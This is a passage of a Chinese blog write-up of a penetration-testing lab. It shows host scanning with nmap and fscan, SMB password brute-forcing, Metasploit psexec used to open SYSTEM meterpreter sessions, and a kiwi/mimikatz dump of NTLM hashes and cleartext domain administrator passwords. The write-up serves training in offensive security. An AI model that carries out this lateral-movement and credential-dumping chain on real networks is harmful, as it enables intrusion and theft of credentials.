+</span></span><span style="display:flex;"><span>Stats: 0:01:11 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 46.15% <span style="color:#66d9ef">done</span>; ETC: 18:59 <span style="color:#f92672">(</span>0:01:22 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.20
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0079s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn?
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack <span style="color:#ae81ff">2</span> microsoft-ds
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s     Microsoft SQL Server <span style="color:#ae81ff">2008</span> 10.00.1600.00; RTM
+</span></span><span style="display:flex;"><span>| ms-sql-info:
+</span></span><span style="display:flex;"><span>|   192.168.93.20<span style="color:#ae81ff">\M</span>SSQLSERVER:
+</span></span><span style="display:flex;"><span>|     Instance name: MSSQLSERVER
+</span></span><span style="display:flex;"><span>|     Version:
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2008</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 10.00.1600.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2008</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|     TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>|_    Clustered: false
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
+</span></span><span style="display:flex;"><span>|   192.168.93.20<span style="color:#ae81ff">\M</span>SSQLSERVER:
+</span></span><span style="display:flex;"><span>|     Target_Name: TEST
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: TEST
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: WIN2008
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: test.org
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: win2008.test.org
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: test.org
+</span></span><span style="display:flex;"><span>|_    Product_Version: 6.0.6003
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-08T11:00:20+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2019-12-15T05:29:23
+</span></span><span style="display:flex;"><span>|_Not valid after:  2049-12-15T05:29:23
+</span></span><span style="display:flex;"><span>2383/tcp  open  ms-olap4?
+</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49156/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :        
+</span></span><span style="display:flex;"><span>SF-Port139-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/8%Time<span style="color:#f92672">=</span>67050FFA%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>SF:GetRequest,5,<span style="color:#e6db74">&#34;\x83\0\0\x01\x8f&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Microsoft Windows XP|7|<span style="color:#ae81ff">2012</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
+</span></span><span style="display:flex;"><span>OS details: Microsoft Windows XP SP3 or Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2012</span>
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WIN2008, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:ab:44:ec <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -1h36m00s, deviation: 3h34m37s, median: -1s
+</span></span><span style="display:flex;"><span>| smb-os-discovery:
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter 6.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp2
+</span></span><span style="display:flex;"><span>|   Computer name: win2008
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: WIN2008<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: test.org
+</span></span><span style="display:flex;"><span>|   Forest name: test.org
+</span></span><span style="display:flex;"><span>|   FQDN: win2008.test.org
+</span></span><span style="display:flex;"><span>|_  System time: 2024-10-08T18:58:24+08:00
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|_  start_date: 2019-12-14T11:49:34
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2:0:2:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using proto 1/icmp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   0.84 ms 192.168.3.2
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   1.19 ms 192.168.93.20
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 211.63 seconds
+</span></span></code></pre></div><p>等其他两个nmap扫描的时候,才发现我忘了上内网神器fscan了&hellip;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.10</span>
+</span></span><span style="display:flex;"><span>start infoscan
+</span></span><span style="display:flex;"><span>192.168.93.10:445 open
+</span></span><span style="display:flex;"><span>192.168.93.10:139 open
+</span></span><span style="display:flex;"><span>192.168.93.10:135 open
+</span></span><span style="display:flex;"><span>192.168.93.10:88 open
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>start vulscan
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetInfo 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>192.168.93.10
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>WIN-8GA56TNV3MV
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>192.168.93.10
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OsInfo 192.168.93.10        <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter 9600<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetBios 192.168.93.10   <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DC:WIN-8GA56TNV3MV.test.org      Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter <span style="color:#ae81ff">9600</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.20</span>
+</span></span><span style="display:flex;"><span>start infoscan
+</span></span><span style="display:flex;"><span>192.168.93.20:1433 open
+</span></span><span style="display:flex;"><span>192.168.93.20:445 open
+</span></span><span style="display:flex;"><span>192.168.93.20:139 open
+</span></span><span style="display:flex;"><span>192.168.93.20:135 open
+</span></span><span style="display:flex;"><span>192.168.93.20:80 open
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>start vulscan
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetInfo
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>192.168.93.20
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>win2008
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>192.168.93.20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://192.168.93.20      code:404 len:315    title:Not Found
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetBios 192.168.93.20   win2008.test.org                    Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OsInfo 192.168.93.20        <span style="color:#f92672">(</span>Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack 2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>已完成 5/5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 扫描结束,耗时: 1.224541199s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.30</span>
+</span></span><span style="display:flex;"><span>start infoscan
+</span></span><span style="display:flex;"><span>192.168.93.30:445 open
+</span></span><span style="display:flex;"><span>192.168.93.30:139 open
+</span></span><span style="display:flex;"><span>192.168.93.30:135 open
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>start vulscan
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetInfo 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>192.168.93.30
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>win7
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>192.168.93.30
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OsInfo 192.168.93.30        <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack 1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>已完成 3/3
+</span></span></code></pre></div><p>另外两台机器最终放弃掉nmap的扫描了,太慢了</p>
+<p>总结一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test.org域内
+</span></span><span style="display:flex;"><span>192.168.93.10 win2012 DC
+</span></span><span style="display:flex;"><span>192.168.93.20 win2008 
+</span></span><span style="display:flex;"><span>另外有一台机器不在TEST域内
+</span></span><span style="display:flex;"><span>192.168.93.30 win7
+</span></span></code></pre></div><h3 id="smb凭据爆破">smb凭据爆破</h3>
+<p>到这里为止,横向移动的思路卡住了,去看了一下网上的各种解法,最常见的就是爆破smb的凭据了&hellip;.我选的几个字典都没有这个密码,手动添加一下&hellip;..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;100i 123qwe!ASD&#39;</span> rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>administrator:123qwe!ASD
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_17.png" alt=""  />
+附上其他师傅的横向思路</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1、mssql要是拿到高权限（sa账号权限）可以尝试通过mssql写 shell 然后提权。
+</span></span><span style="display:flex;"><span>2、在进行横向移动时，内网设备扫不出来其他漏洞，只能通过 SMB 爆破或者 NTLM Relay 攻击，SMB 爆破比较碰运气，在实际过程中可以通过收集公司及管理员信息生成对应字典；NTLM Relay 攻击类似社工钓鱼，遇到安全意识不高的管理员才有可能成功，并且在内网环境中安装Python和对应的库也是比较麻烦的，可以考虑使用 conda 等创建虚拟环境，然后一起打包上传到对应靶机，但是相应的环境配置也是比较容易出问题。
+</span></span></code></pre></div><h3 id="psexec拿shell">psexec拿shell</h3>
+<p>使用msf的windows/smb/psexec模块,拿到20,30机器的shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set rhosts 192.168.93.20,30
+</span></span><span style="display:flex;"><span>rhosts <span style="color:#f92672">=</span>&gt; 192.168.93.20,30
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting target 192.168.93.20
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Connecting to the server...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Authenticating to 192.168.93.20:445 as user <span style="color:#e6db74">&#39;administrator&#39;</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Selecting PowerShell target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Executing the payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.93.20:445 - Service start timed out, OK <span style="color:#66d9ef">if</span> running a command or non-service executable...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started bind TCP handler against 192.168.93.20:4444
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">201798</span> bytes<span style="color:#f92672">)</span> to 192.168.93.20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>192.168.3.100:39039 -&gt; 192.168.93.20:4444<span style="color:#f92672">)</span> at 2024-10-08 19:47:02 +0800
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session <span style="color:#ae81ff">7</span> created in the background.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting target 192.168.93.30
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Connecting to the server...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Authenticating to 192.168.93.30:445 as user <span style="color:#e6db74">&#39;administrator&#39;</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Selecting PowerShell target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Executing the payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.93.30:445 - Service start timed out, OK <span style="color:#66d9ef">if</span> running a command or non-service executable...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started bind TCP handler against 192.168.93.30:4444
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">201798</span> bytes<span style="color:#f92672">)</span> to 192.168.93.30
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">8</span> opened <span style="color:#f92672">(</span>192.168.3.100:42267 -&gt; 192.168.93.30:4444<span style="color:#f92672">)</span> at 2024-10-08 19:47:07 +0800
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session <span style="color:#ae81ff">8</span> created in the background.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type                     Information                    Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----                     -----------                    ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">7</span>         meterpreter x64/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ WIN2008  192.168.3.100:39039 -&gt; 192.168.93.20:4444 <span style="color:#f92672">(</span>192.168.93.20<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">8</span>         meterpreter x64/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ WIN7     192.168.3.100:42267 -&gt; 192.168.93.30:4444 <span style="color:#f92672">(</span>192.168.93.30<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="kiwi模块获取dc凭据">kiwi模块获取DC凭据</h3>
+<p>还剩下一个域控机器,先进入win2008的会话中,加载一下kiwi</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; creds_all
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving all credentials
+</span></span><span style="display:flex;"><span>msv credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username       Domain   LM                                NTLM                              SHA1
+</span></span><span style="display:flex;"><span>--------       ------   --                                ----                              ----
+</span></span><span style="display:flex;"><span>Administrator  TEST     fc5d63d71569f04399b419bc76e2eb34  18edd0cc3227be3bf61ce198835a1d97  0f058e319f079c15fe3449bbeffc086cfa4d231e
+</span></span><span style="display:flex;"><span>Administrator  WIN2008  ae946ec6f4ca785b93371dee1d5ee7e6  31c1794c5aa8547c87a8bcd0324b8337  128c0272959b85b330090611169d07d85cb6bd0b
+</span></span><span style="display:flex;"><span>WIN2008$       TEST                                       c47b1f47431b259861e615472864c698  5a09ade7dca624916c39473fd609c22302dd33bc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wdigest credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username       Domain   Password
+</span></span><span style="display:flex;"><span>--------       ------   --------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>         <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>   <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Administrator  TEST     zxcASDqw123!!
+</span></span><span style="display:flex;"><span>Administrator  WIN2008  123qwe!ASD
+</span></span><span style="display:flex;"><span>WIN2008$       TEST     <span style="color:#ae81ff">94</span> 1f <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">44</span> 5a 0c 6d 4d dd a9 9d <span style="color:#ae81ff">09</span> 7a d0 <span style="color:#ae81ff">72</span> bb e9 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">69</span> 7e <span style="color:#ae81ff">96</span> 9f <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span> f2 9e d3 f2 <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">74</span> 7a 2f <span style="color:#ae81ff">49</span> 4e b7 <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">01</span> e5 <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">75</span> 8f <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">44</span> d4 <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">17</span>   
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">25</span> 2a d4 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">87</span> ec <span style="color:#ae81ff">34</span> e8 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">74</span> 8f b6 0a ef <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">17</span> af 2e 5b <span style="color:#ae81ff">08</span> f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">09</span> <span style="color:#ae81ff">96</span> f6 <span style="color:#ae81ff">75</span> b5 0d   
+</span></span><span style="display:flex;"><span>                        c1 e1 <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">07</span> d2 a8 <span style="color:#ae81ff">99</span> e5 5f 7d e9 0c <span style="color:#ae81ff">76</span> a3 7e <span style="color:#ae81ff">51</span> e5 f1 d0 f0 da c5 0c <span style="color:#ae81ff">88</span> d0 1c <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">34</span> b9 3e <span style="color:#ae81ff">14</span> ab a1 7b <span style="color:#ae81ff">56</span> cd 9d <span style="color:#ae81ff">67</span> d3 <span style="color:#ae81ff">19</span> c7 ad d9 b2 8d <span style="color:#ae81ff">72</span> e9   
+</span></span><span style="display:flex;"><span>                        2a c2 d0 be ff e7 e7 d2 <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">85</span> 9a <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">74</span> 8c d5 0a b5 1c <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">28</span> de <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">58</span> 8a da 3a db <span style="color:#ae81ff">61</span> 5d be f9 d5 b8 a8 5c fe <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">06</span> f6 ac ac <span style="color:#ae81ff">26</span> 6d <span style="color:#ae81ff">22</span>   
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">80</span> e3 f4 f6 <span style="color:#ae81ff">49</span> f8 <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">78</span> 9b a7 <span style="color:#ae81ff">36</span> 6d f7 c4 <span style="color:#ae81ff">10</span> a3 8e <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">83</span> c5 <span style="color:#ae81ff">84</span> ff 3f fc 9c <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">81</span> 2d <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">42</span> 8a <span style="color:#ae81ff">30</span> 5a 7e ca ee 3f <span style="color:#ae81ff">50</span> 0b c8 c6 <span style="color:#ae81ff">68</span> a8 <span style="color:#ae81ff">24</span> cc c0 <span style="color:#ae81ff">52</span>   
+</span></span><span style="display:flex;"><span>                        5e b8 <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">30</span> b7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tspkg credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username       Domain   Password
+</span></span><span style="display:flex;"><span>--------       ------   --------
+</span></span><span style="display:flex;"><span>Administrator  TEST     zxcASDqw123!!
+</span></span><span style="display:flex;"><span>Administrator  WIN2008  123qwe!ASD
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kerberos credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username       Domain    Password
+</span></span><span style="display:flex;"><span>--------       ------    --------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>         <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>    <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Administrator  TEST.ORG  zxcASDqw123!!
+</span></span><span style="display:flex;"><span>Administrator  WIN2008   123qwe!ASD
